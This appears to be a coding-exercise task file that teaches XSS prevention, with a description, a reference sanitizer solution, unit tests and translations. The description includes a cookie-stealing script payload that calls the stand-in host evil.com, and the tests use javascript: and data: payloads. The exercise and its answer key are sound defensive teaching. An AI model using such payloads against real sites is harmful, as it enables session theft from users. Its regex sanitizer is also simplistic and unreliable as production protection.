import { Task } from '../../../../../../../types';

export const task: Task = {
	slug: 'sec-xss-prevention',
	title: 'XSS: Cross-Site Scripting Prevention',
	difficulty: 'medium',
	tags: ['security', 'owasp', 'xss', 'typescript'],
	estimatedTime: '40m',
	isPremium: false,
	youtubeUrl: '',
	description: `Learn to prevent Cross-Site Scripting (XSS) - one of the most common web vulnerabilities.

**What is XSS?**

XSS attacks occur when an attacker injects malicious scripts into content that is served to other users. The victim's browser executes the script because it trusts the source.

**Three Types of XSS:**

1. **Reflected XSS** - Script is reflected off the server (e.g., search results)
2. **Stored XSS** - Script is stored in database and served to users
3. **DOM-based XSS** - Script manipulates the DOM directly in browser

**Attack Example:**

\`\`\`html
<!-- User submits this as their "name" -->
<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>

<!-- Without sanitization, other users see: -->
<p>Welcome, <script>...</script>!</p>
<!-- Their cookies are stolen! -->
\`\`\`

**Your Task:**

Implement an \`XssSanitizer\` class that:

1. Escapes HTML special characters
2. Strips dangerous HTML tags
3. Sanitizes URLs to prevent javascript: attacks
4. Provides Content Security Policy header recommendations

**Example Usage:**

\`\`\`typescript
const sanitizer = new XssSanitizer();

// Escape HTML
sanitizer.escapeHtml('<script>alert("xss")</script>');
// Returns: &lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;

// Strip dangerous tags
sanitizer.stripTags('<b>Hello</b><script>evil()</script>');
// Returns: <b>Hello</b>

// Sanitize URL
sanitizer.sanitizeUrl('javascript:alert(1)'); // ''
sanitizer.sanitizeUrl('https://example.com'); // 'https://example.com'
\`\`\``,
	initialCode: `interface SanitizeOptions {
  allowedTags?: string[];
  allowedAttributes?: string[];
}

interface CspDirective {
  directive: string;
  value: string;
}

class XssSanitizer {
  private readonly DEFAULT_ALLOWED_TAGS = ['b', 'i', 'u', 'strong', 'em', 'p', 'br', 'ul', 'ol', 'li'];
  private readonly DANGEROUS_TAGS = ['script', 'iframe', 'object', 'embed', 'form', 'input', 'style'];
  private readonly DANGEROUS_PROTOCOLS = ['javascript:', 'data:', 'vbscript:'];

  escapeHtml(input: string): string {
    // TODO: Escape HTML special characters
    // & -> &amp;
    // < -> &lt;
    // > -> &gt;
    // " -> &quot;
    // ' -> &#x27;
    return input;
  }

  stripTags(input: string, options?: SanitizeOptions): string {
    // TODO: Remove dangerous tags while keeping allowed ones
    // Use DANGEROUS_TAGS list or custom allowedTags from options
    return input;
  }

  sanitizeUrl(url: string): string {
    // TODO: Check URL for dangerous protocols
    // Return empty string if dangerous, otherwise return url
    return url;
  }

  sanitizeAttribute(name: string, value: string): string {
    // TODO: Sanitize attribute values
    // Escape quotes and check for javascript: in event handlers
    return value;
  }

  generateCspHeader(): CspDirective[] {
    // TODO: Generate recommended CSP directives
    // Return array of directive objects
    return [];
  }
}

export { XssSanitizer, SanitizeOptions, CspDirective };`,
	solutionCode: `interface SanitizeOptions {
  allowedTags?: string[];
  allowedAttributes?: string[];
}

interface CspDirective {
  directive: string;
  value: string;
}

class XssSanitizer {
  private readonly DEFAULT_ALLOWED_TAGS = ['b', 'i', 'u', 'strong', 'em', 'p', 'br', 'ul', 'ol', 'li'];
  private readonly DANGEROUS_TAGS = ['script', 'iframe', 'object', 'embed', 'form', 'input', 'style'];
  private readonly DANGEROUS_PROTOCOLS = ['javascript:', 'data:', 'vbscript:'];

  // Escape HTML special characters to prevent XSS
  escapeHtml(input: string): string {
    return input
      .replace(/&/g, '&amp;')      // Must be first to avoid double-encoding
      .replace(/</g, '&lt;')       // Prevent tag injection
      .replace(/>/g, '&gt;')       // Close tag prevention
      .replace(/"/g, '&quot;')     // Attribute injection prevention
      .replace(/'/g, '&#x27;');    // Single quote (alternate: &apos;)
  }

  // Remove dangerous tags while keeping safe ones
  stripTags(input: string, options?: SanitizeOptions): string {
    const allowedTags = options?.allowedTags || this.DEFAULT_ALLOWED_TAGS;

    // Remove all dangerous tags completely (including content)
    let result = input;
    for (const tag of this.DANGEROUS_TAGS) {
      // Remove opening and closing tags with content
      const tagRegex = new RegExp(\`<\${tag}[^>]*>[\\\\s\\\\S]*?</\${tag}>\`, 'gi');
      result = result.replace(tagRegex, '');
      // Remove self-closing dangerous tags
      const selfClosingRegex = new RegExp(\`<\${tag}[^>]*/?>|</\${tag}>\`, 'gi');
      result = result.replace(selfClosingRegex, '');
    }

    // Remove any remaining tags not in allowed list
    result = result.replace(/<\\/?([a-z][a-z0-9]*)\\b[^>]*>/gi, (match, tagName) => {
      return allowedTags.includes(tagName.toLowerCase()) ? match : '';
    });

    return result;
  }

  // Sanitize URLs to prevent javascript: and other dangerous protocols
  sanitizeUrl(url: string): string {
    const trimmedUrl = url.trim().toLowerCase();

    // Check for dangerous protocols
    for (const protocol of this.DANGEROUS_PROTOCOLS) {
      if (trimmedUrl.startsWith(protocol)) {
        return '';  // Block dangerous URLs
      }
    }

    // Check for encoded javascript
    const decodedUrl = decodeURIComponent(trimmedUrl);
    for (const protocol of this.DANGEROUS_PROTOCOLS) {
      if (decodedUrl.startsWith(protocol)) {
        return '';  // Block encoded dangerous URLs
      }
    }

    return url;  // URL is safe
  }

  // Sanitize attribute values
  sanitizeAttribute(name: string, value: string): string {
    // Event handlers are dangerous
    if (name.toLowerCase().startsWith('on')) {
      return '';  // Block event handlers like onclick, onload
    }

    // Check href/src for dangerous protocols
    if (['href', 'src', 'action'].includes(name.toLowerCase())) {
      return this.sanitizeUrl(value);
    }

    // Escape quotes in attribute values
    return value
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#x27;');
  }

  // Generate recommended Content Security Policy directives
  generateCspHeader(): CspDirective[] {
    return [
      { directive: 'default-src', value: "'self'" },           // Only load from same origin
      { directive: 'script-src', value: "'self'" },            // Scripts from same origin only
      { directive: 'style-src', value: "'self' 'unsafe-inline'" }, // Styles (inline needed for some frameworks)
      { directive: 'img-src', value: "'self' data: https:" },  // Images from self, data URIs, HTTPS
      { directive: 'font-src', value: "'self'" },              // Fonts from same origin
      { directive: 'connect-src', value: "'self'" },           // XHR/WebSocket to same origin
      { directive: 'frame-ancestors', value: "'none'" },       // Prevent framing (clickjacking)
      { directive: 'base-uri', value: "'self'" },              // Restrict <base> tag
      { directive: 'form-action', value: "'self'" },           // Forms submit to same origin
    ];
  }
}

export { XssSanitizer, SanitizeOptions, CspDirective };`,
	hint1: `For escapeHtml, use replace() with regex for each special character. Order matters: escape & first to avoid double-encoding &lt; as &amp;lt;`,
	hint2: `For stripTags, loop through DANGEROUS_TAGS and use regex to remove them. Then use another regex to remove any remaining tags not in allowedTags list.`,
	testCode: `import { XssSanitizer } from './solution';

// Test1: escapeHtml escapes < and >
test('Test1', () => {
  const sanitizer = new XssSanitizer();
  const result = sanitizer.escapeHtml('<script>');
  expect(result).toBe('&lt;script&gt;');
});

// Test2: escapeHtml escapes quotes
test('Test2', () => {
  const sanitizer = new XssSanitizer();
  const result = sanitizer.escapeHtml('say "hello"');
  expect(result).toContain('&quot;');
});

// Test3: escapeHtml escapes ampersand
test('Test3', () => {
  const sanitizer = new XssSanitizer();
  const result = sanitizer.escapeHtml('Tom & Jerry');
  expect(result).toBe('Tom &amp; Jerry');
});

// Test4: stripTags removes script tags
test('Test4', () => {
  const sanitizer = new XssSanitizer();
  const result = sanitizer.stripTags('<b>Hello</b><script>evil()</script>');
  expect(result).not.toContain('script');
  expect(result).toContain('<b>Hello</b>');
});

// Test5: stripTags removes iframe tags
test('Test5', () => {
  const sanitizer = new XssSanitizer();
  const result = sanitizer.stripTags('<iframe src="evil.com"></iframe>');
  expect(result).not.toContain('iframe');
});

// Test6: sanitizeUrl blocks javascript: protocol
test('Test6', () => {
  const sanitizer = new XssSanitizer();
  expect(sanitizer.sanitizeUrl('javascript:alert(1)')).toBe('');
});

// Test7: sanitizeUrl allows https URLs
test('Test7', () => {
  const sanitizer = new XssSanitizer();
  expect(sanitizer.sanitizeUrl('https://example.com')).toBe('https://example.com');
});

// Test8: sanitizeAttribute blocks event handlers
test('Test8', () => {
  const sanitizer = new XssSanitizer();
  expect(sanitizer.sanitizeAttribute('onclick', 'alert(1)')).toBe('');
});

// Test9: generateCspHeader returns directives
test('Test9', () => {
  const sanitizer = new XssSanitizer();
  const csp = sanitizer.generateCspHeader();
  expect(csp.length).toBeGreaterThan(0);
  expect(csp.find(d => d.directive === 'script-src')).toBeDefined();
});

// Test10: sanitizeUrl blocks data: protocol
test('Test10', () => {
  const sanitizer = new XssSanitizer();
  expect(sanitizer.sanitizeUrl('data:text/html,<script>alert(1)</script>')).toBe('');
});`,
	whyItMatters: `XSS is consistently in the OWASP Top 10 and affects millions of websites.

**Real-World Impact:**

**1. British Airways (2018)**
\`\`\`
Attack: Magecart XSS injection in payment page
Impact: 380,000 payment cards stolen
Fine: £20 million (GDPR)
Method: Injected script captured card details
\`\`\`

**2. Fortnite (2019)**
\`\`\`
Attack: XSS in old unsecured page
Impact: Potential access to 200M+ accounts
Method: Stole authentication tokens via XSS
Fixed before exploitation
\`\`\`

**3. eBay (2015-2016)**
\`\`\`
Attack: Stored XSS in product listings
Impact: Redirected users to phishing sites
Method: Malicious JavaScript in listing descriptions
\`\`\`

**Defense Layers:**

| Layer | Method | Coverage |
|-------|--------|----------|
| Output Encoding | \`escapeHtml()\` | All user data |
| Input Validation | Whitelist chars | Form inputs |
| CSP Headers | \`Content-Security-Policy\` | Browser enforcement |
| HttpOnly Cookies | \`Set-Cookie: HttpOnly\` | Session protection |
| X-XSS-Protection | Deprecated | Legacy browsers |

**Framework Protection:**

\`\`\`typescript
// React - Auto-escapes by default
<div>{userInput}</div>  // Safe

// But dangerouslySetInnerHTML bypasses it
<div dangerouslySetInnerHTML={{__html: userInput}} />  // DANGEROUS!

// Vue - Auto-escapes with {{ }}
<div>{{ userInput }}</div>  // Safe
<div v-html="userInput"></div>  // DANGEROUS!

// Angular - Auto-escapes
<div>{{userInput}}</div>  // Safe
<div [innerHTML]="userInput"></div>  // Sanitized by Angular
\`\`\`

**CSP Example:**
\`\`\`
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-abc123';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  frame-ancestors 'none';
\`\`\``,
	order: 1,
	translations: {
		ru: {
			title: 'XSS: Предотвращение межсайтового скриптинга',
			description: `Научитесь предотвращать Cross-Site Scripting (XSS) - одну из самых распространённых веб-уязвимостей.

**Что такое XSS?**

XSS-атаки происходят, когда злоумышленник внедряет вредоносные скрипты в контент, который отображается другим пользователям.

**Три типа XSS:**

1. **Отражённый XSS** - Скрипт отражается от сервера
2. **Хранимый XSS** - Скрипт сохраняется в БД
3. **DOM-based XSS** - Скрипт манипулирует DOM

**Ваша задача:**

Реализуйте класс \`XssSanitizer\`:

1. Экранирование HTML спецсимволов
2. Удаление опасных HTML тегов
3. Санитизация URL для предотвращения javascript: атак
4. Генерация рекомендаций по CSP заголовкам`,
			hint1: `Для escapeHtml используйте replace() с regex для каждого спецсимвола. Порядок важен: экранируйте & первым.`,
			hint2: `Для stripTags пройдитесь по DANGEROUS_TAGS и удалите их через regex. Затем удалите оставшиеся теги не из allowedTags.`,
			whyItMatters: `XSS постоянно находится в OWASP Top 10 и затрагивает миллионы веб-сайтов.`
		},
		uz: {
			title: 'XSS: Saytlararo skript oldini olish',
			description: `Cross-Site Scripting (XSS) ni oldini olishni o'rganing - eng keng tarqalgan veb-zaifliklardan biri.

**XSS nima?**

XSS hujumlari tajovuzkor zararli skriptlarni boshqa foydalanuvchilarga ko'rsatiladigan kontentga kiritganda yuz beradi.

**Sizning vazifangiz:**

\`XssSanitizer\` klassini amalga oshiring:

1. HTML maxsus belgilarni qochirish
2. Xavfli HTML teglarni olib tashlash
3. javascript: hujumlarni oldini olish uchun URL sanitizatsiyasi
4. CSP sarlavha tavsiyalarini yaratish`,
			hint1: `escapeHtml uchun har bir maxsus belgi uchun regex bilan replace() dan foydalaning.`,
			hint2: `stripTags uchun DANGEROUS_TAGS bo'ylab yuring va ularni regex orqali olib tashlang.`,
			whyItMatters: `XSS doimiy ravishda OWASP Top 10 da bo'lib, millionlab veb-saytlarga ta'sir qiladi.`
		}
	}
};

export default task;
